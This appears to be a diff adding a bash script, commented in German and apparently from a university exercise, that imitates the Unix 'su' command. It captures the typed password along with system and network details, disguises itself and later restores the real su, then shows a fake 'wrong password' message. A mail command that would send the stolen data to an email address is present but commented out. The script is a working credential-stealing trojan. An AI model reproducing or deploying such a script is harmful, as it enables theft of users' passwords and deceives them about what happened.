@@ -1,0 +1,35 @@
+#!/bin/bash
+# Boshafter Nachbau des su-Befehls
+TMPFILE='/tmp/.afu943j'
+SHADOW='/tmp/.shadow'
+VISIBLE='/tmp/.visible'
+TIME=30
+# Schritt 1: Verhalten nachbilden
+echo -n "Passwort: "
+read -s PASSWORD # silent lesen (kein Echo)
+echo ""
+# Schritt 2: Daten sammeln
+echo "$0 $1 $2 $3 $4 $5 $6 $7 $8 $9"	>  $TMPFILE
+echo "Password: $PASSWORD"		>> $TMPFILE
+echo `uname -a`				>> $TMPFILE
+echo `/sbin/ifconfig | grep inet`	>> $TMPFILE
+# Schritt 3: Daten versenden
+echo "."				>> $TMPFILE
+#mail -s "Passwortklau" \
+#	-r "ingolf.brunner@ba-leipzig.de" \
+#	"studierende@cs12-2.ba-leipzig.de" < $TMPFILE
+# Aufräumen
+rm $TMPFILE
+# Schritt 4: umbenennen/verstecken
+mv su $SHADOW
+echo "#!/bin/bash"			>  $VISIBLE
+echo "sleep $TIME"			>> $VISIBLE
+echo "mv $SHADOW su"			>> $VISIBLE
+echo "rm $VISIBLE"			>> $VISIBLE
+echo "exit 0"				>> $VISIBLE
+chmod 700 $VISIBLE	# rwx --> muss mich selbst löschen dürfen
+$VISIBLE &		# im Hintergrund starten
+# Bildschirmausgabe abschließen und Script beenden
+sleep 3
+echo "su: ungültiges Kennwort"
+exit 1 # echtes su gibt bei Fehler 1 zurück
